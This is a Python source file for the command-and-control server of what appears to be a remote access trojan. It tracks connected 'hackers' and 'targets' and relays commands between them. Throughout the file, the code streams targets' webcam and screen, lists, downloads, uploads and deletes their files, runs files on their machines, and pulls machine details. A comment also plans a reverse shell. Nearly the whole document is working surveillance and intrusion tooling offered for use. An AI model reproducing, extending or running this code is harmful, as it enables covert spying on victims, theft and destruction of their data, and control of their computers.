import socket
import time
import threading
import json
import pickle
import struct

print('[BOOT] Starting Server...')

HEADERLENGTH = 10

with open('serverData.json', 'r') as f:
    data = json.load(f)
    IP = data[0]['ip'] 
    PORT = data[0]['port']

    f.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


s.bind((IP,PORT))
print(f'[BOOT] Binded to address- {IP}:{PORT}')

s.listen()

hackers_list = []
targets_list = []

def check_disconnect():
    while True:
        try:
            for i in range(0, len(hackers_list)):
                cs = hackers_list[i]['socket']
                cs.send(b'')

        except ConnectionResetError:
            print(f"[CONNECTION] {hackers_list[i]['name']} has disconnected.")
            del hackers_list[i]

        except IndexError:
            continue
        
        except ConnectionAbortedError:
            print(f"[CONNECTION] {hackers_list[i]['name']} has disconnected.")
            del hackers_list[i]

        try:
            for i in range(0, len(targets_list)):
                cs = targets_list[i]['socket']
                cs.send(b'')
                    
        except ConnectionResetError:
            print(f"[CONNECTION] {targets_list[i]['name']} has disconnected.")
            del targets_list[i]

        except IndexError:
            break

        except ConnectionAbortedError:
            print(f"[CONNECTION] {targets_list[i]['name']} has disconnected.")
            del targets_list[i]


def accepting_connections():
    listener = True
    print(f'[BOOT] Server has started. Listening on {IP}:{PORT}')

    while True:
        if listener == True:
            cs, ca = s.accept()
            listener = False

        info = cs.recv(300).decode('utf-8')
        info = info.split('|')

        if info[0] == 'HACKER':
            hackers_list.append({'socket': cs, 'address': ca, 'name': info[1], 'id': info[2]})           
            print(f"[CONNECTION] Hacker connected. Name: {info[1]} | ID: {info[2]}")

        if info[0] == 'TARGET':
            targets_list.append({'socket': cs, 'address': ca, 'name': info[1], 'id': info[2]})
            print(f"[CONNECTION] Target connected. Name: {info[1]} | ID: {info[2]}")

        if info[0] == 'SETUP':
            print("[LOG] Admin connected.")
            try:
                with open("targets.json", 'r') as f:
                    targetData = json.load(f)

                assignableID = len(targetData) + 1

                targetObject = {"Name":info[1],"ID":assignableID,"IP":info[2]}
                targetData.append(targetObject)

                with open("targets.json", 'w') as f:
                    targetData = json.dump(targetData, f, indent=4)

            except:
                cs.send(bytes(f"N|",'utf-8'))
                print("[LOG] Admin disconnected due to an error.")
                raise

            cs.send(bytes(f"Y|{assignableID}",'utf-8'))
            print(f"[LOG] Created new target instance: Name: {info[1]} | ID: {assignableID}")
            print("[LOG] Admin disconnected.")

        listener = True





def listen_commands():
    # Available commands:
    # Hacked users; Camera Footage; Screen Footage;
    # Files; Reverse-Shell; Hacked users details

    while True:
        for i in range(0, len(hackers_list)):
            cs = hackers_list[i]['socket']

            try:
                command = cs.recv(300).decode('utf-8')

                if command == '':
                    continue

                print(f'[COMMAND] Command received: "{command}"')
            except ConnectionResetError:
                break

            if command == 'GET_VACANT_ID':
                with open("targets.json", 'r') as f:
                    data = json.load(f)

                    vacantID = str(data[len(data)-1]['ID']+1)

                    cs.send(bytes(vacantID, 'utf-8'))
                    print("[COMMAND] Sent a vacant id to ADMIN.")
                    f.close()



            if command == 'GET_TARGETS': 
                with open('targets.json','r') as f: # CHANGE LATER
                    data = json.load(f)

                    pdata = pickle.dumps(data)
                    cs.send(bytes(f'{len(pdata):<{HEADERLENGTH}}','utf-8') + pdata) 
                    print(f'[COMMAND] Sent all targets to {hackers_list[i]["id"]}. {hackers_list[i]["name"]}')

                break

            elif command == 'GET_ONLINE_TARGETS':
                if targets_list == []:
                    cs.send(bytes('NO_ONLINE_TARGETS','utf-8'))
                msg = ''
                for g in range(0, len(targets_list)):
                    msg +=f"""
Name: {targets_list[g]["name"]}
ID: {targets_list[g]["id"]}
                    """

                cs.send(bytes(msg,'utf-8'))
                print(f'[COMMAND] Sent all online targets to {hackers_list[i]["id"]}. {hackers_list[i]["name"]}')

            elif command == 'GET_CAMERA_FOOTAGE':
                target_id = cs.recv(1024).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('GET_CAMERA_FOOTAGE','utf-8'))
                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                while True:
                    try:
                        frame_size = ts.recv(8)
                        frame_size_unpckd = struct.unpack('Q', frame_size)[0]

                        data = b''
                        while len(data) < frame_size_unpckd:
                            packet = ts.recv(min(frame_size_unpckd - len(data), 1024*1024*32))
                            data += packet
                                                
                        cs.send(frame_size)
                        cs.sendall(data)

                        proceed = cs.recv(1).decode()

                        if proceed == 'Y':
                            ts.send(bytes('Y'.encode()))
                            continue

                        else:
                            ts.send(bytes('N'.encode()))
                            break 

                    except ConnectionResetError:
                        print("[LOG] Target disconnected while sharing camera footage.")
                        break


                print('[COMMAND] Finished sending camera footage')

            elif command == 'GET_SCREEN_CAPTURE':
                target_id = cs.recv(1024).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('GET_SCREEN_CAPTURE','utf-8'))
                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                while True:
                    try:
                        ss_size = ts.recv(8)
                        ss_size_unpckd = struct.unpack('Q', ss_size)[0]

                        data = b''
                        while len(data) < ss_size_unpckd:
                            packet = ts.recv(min(ss_size_unpckd - len(data), 1024*1024*32))
                            data += packet                        

                        cs.send(ss_size)
                        cs.sendall(data)

                        proceed = cs.recv(1).decode()

                        if proceed == 'Y':
                            ts.send(bytes('Y'.encode()))
                            continue

                        else:
                            print("[LOG] Finished sharing screen capture.")
                            ts.send(bytes('N'.encode()))
                            break            
                    except ConnectionResetError:        
                        print("[LOG] Target disconnected while screensharing.")
                        break

                print('[COMMAND] Finished sending screen capture.')       
                break

            elif command == 'GET_FILES':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('GET_FILES','utf-8'))
                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                dir = cs.recv(300)
                ts.send(dir)

                data = ts.recv(1024*10)
                cs.send(data)

                break
            
            elif command == 'DOWNLOAD_FILE':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False


                try:
                    ts.send(bytes('DOWNLOAD_FILE','utf-8'))

                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                dir = cs.recv(300)
                ts.send(dir)

                confirm = ts.recv(100).decode('utf-8')

                if confirm == 'INVALID':
                    cs.send(bytes('INVALID','utf-8'))
                    break

                elif confirm == 'VALID':
                    cs.send(bytes('VALID','utf-8'))
                
                file_size = ts.recv(1024)
                cs.send(file_size)

                data = ts.recv(int(file_size.decode('utf-8')))
                cs.sendall(data)
                
                    
                print('[LOG] Sent a file to hacker.')
                break

            elif command == 'UPLOAD':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False
                try:
                    ts.send(bytes('UPLOAD','utf-8'))

                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('VALID','utf-8'))

                details = cs.recv(300)
                ts.send(details)

                confirm = ts.recv(100)
                cs.send(confirm)

                file_size = cs.recv(300)
                ts.send(file_size)

                file_size = file_size.decode('utf-8')
                data = cs.recv(int(file_size))
                ts.send(data)

                print('[LOG] Uploaded a file to target.')

            elif command == 'DELETE':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('DELETE','utf-8'))

                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('VALID','utf-8'))

                file_name = cs.recv(300)
                ts.send(file_name)

                conf = ts.recv(100)
                cs.send(conf)

                print('[LOG] Successfully deleted a file in target\'s machine.')

            
            elif command == 'RUN':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('RUN','utf-8'))

                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                file = cs.recv(500)
                ts.send(file)

                confirm = ts.recv(100)
                cs.send(confirm)

                if confirm.decode('utf-8') == 'INVALID':
                    break
            
                print('[LOG] Ran a file for hacker.')



            elif command == 'GET_TARGET_DETAILS':
                target_id = cs.recv(300).decode('utf-8')
                found = False

                for j in range(0, len(targets_list)):
                    if target_id == targets_list[j]['id']:
                        ts = targets_list[j]['socket']
                        found = True

                if found == False:
                        print("[COMMAND] Requested target is offline.")
                        cs.send(bytes('TARGET_OFFLINE','utf-8'))
                        break
                
                found = False

                try:
                    ts.send(bytes('GET_TARGET_DETAILS','utf-8'))

                except UnboundLocalError:
                    print("[COMMAND] Requested target is offline.")
                    cs.send(bytes('TARGET_OFFLINE','utf-8'))
                    break

                cs.send(bytes('ONLINE','utf-8'))

                size = ts.recv(100)
                cs.send(size)

                details = ts.recv(int(size.decode('utf-8')))
                cs.send(details)


t1 = threading.Thread(target=accepting_connections, args=())
t2 = threading.Thread(target=listen_commands, args=())      
t3 = threading.Thread(target=check_disconnect, args=())

t1.start()
t2.start()
t3.start()